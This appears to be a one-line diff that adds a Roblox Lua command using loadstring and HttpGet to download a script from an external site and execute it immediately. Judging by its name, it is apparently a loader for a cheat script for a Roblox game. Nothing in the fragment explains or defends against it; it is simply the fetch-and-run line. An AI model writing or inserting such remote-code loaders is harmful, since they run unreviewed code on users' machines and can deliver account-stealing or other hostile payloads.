@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://nazuro.xyz/99nights'))()
+
